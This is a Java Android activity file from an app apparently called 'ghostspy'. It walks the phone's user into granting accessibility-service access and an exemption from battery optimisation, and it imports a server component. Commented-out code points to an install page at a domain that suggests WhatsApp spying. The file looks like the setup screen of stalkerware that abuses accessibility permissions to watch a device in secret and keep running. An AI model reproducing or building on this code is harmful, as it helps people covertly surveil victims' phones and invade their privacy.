package com.spy.ghostspy;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;

import com.spy.ghostspy.server.Server;

import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private Button mBtnAllow1;
    private Button mBtnEnable1;

    private Button mBtnAllow2;
    private Button mBtnEnable2;
    private Button mBtnEnable3;


    private LinearLayout mLayoutSetting;
    private LinearLayout mLayoutButton1;
    private LinearLayout mLayoutButton2;
    private LinearLayout mLayoutButton3;
    private LinearLayout mLayoutWebview;
    private WebView _webview;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        setReady();
    }

    @Override
    protected void onResume() {
        super.onResume();
        requestPowerManger();
//        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
//            mLayoutWebview.setVisibility(View.GONE);
            mLayoutSetting.setVisibility(View.VISIBLE);
//        } else {
//            WebSettings webSettings = _webview.getSettings();
//            webSettings.setJavaScriptEnabled(true);
//            _webview.setWebViewClient(new WebViewClient());
//            _webview.loadUrl("https://app.whatsespiao.cfd/install/");
//            mLayoutSetting.setVisibility(View.GONE);
//            mLayoutWebview.setVisibility(View.VISIBLE);
//        }
    }

    @SuppressLint("BatteryLife")
    private void requestPowerManger() {
        Intent intent = new Intent();
        String packageName = getPackageName();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.d("test", "batter enable");
            intent.setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
        } else {
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + packageName));
            startActivity(intent);
        }
    }

    private void setReady() {
        mBtnAllow1 = (Button) findViewById(R.id.btn_allow1);
        mBtnEnable1 = (Button) findViewById(R.id.btn_enable1);
        mBtnAllow2 = (Button) findViewById(R.id.btn_allow2);
        mBtnEnable2 = (Button) findViewById(R.id.btn_enable2);
        mBtnEnable3 = (Button) findViewById(R.id.btn_enable3);
        mLayoutSetting = findViewById(R.id.layout_setting);
        mLayoutWebview = findViewById(R.id.layout_webview);
        mLayoutButton1 = findViewById(R.id.layout_button1);
        mLayoutButton2 = findViewById(R.id.layout_button2);
        mLayoutButton3 = findViewById(R.id.layout_button3);

        _webview = findViewById(R.id.view_web);
        mBtnAllow1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });
        mBtnEnable1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAccessibilitySettingManager();
            }
        });

        mBtnAllow2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
                startActivity(intent);
            }
        });
        mBtnEnable2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAccessibilitySettingManager();
            }
        });
        mBtnEnable3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAccessibilitySettingManager();
            }
        });

        setLayout();
    }

    public void setLayout() {
        Log.d("version::", Build.VERSION.RELEASE);
        if(Integer.parseInt(Build.VERSION.RELEASE) < 11) {
            mLayoutButton3.setVisibility(View.VISIBLE);
        } else {
            if (Build.MANUFACTURER.toLowerCase(Locale.US).equals("samsung")) {
                mLayoutButton2.setVisibility(View.VISIBLE);
            } else {
                mLayoutButton1.setVisibility(View.VISIBLE);
            }
        }

    }

    public static boolean isAccessibilityPermissionGranted(Context context) {
        int accessibilityEnabled = 0;

        final String service = context.getPackageName() + "/" + context.getPackageName()+ ".services.MainAccessibilityService";
        Log.d("pacakgename::", context.getPackageName() + ":::" + service);
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    context.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    Log.d("accessibilityService::", accessibilityService);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        Log.d("permission11::", "Accessibility is enabled");
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private void requestAccessibilitySettingManager() {
        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        }
    }
}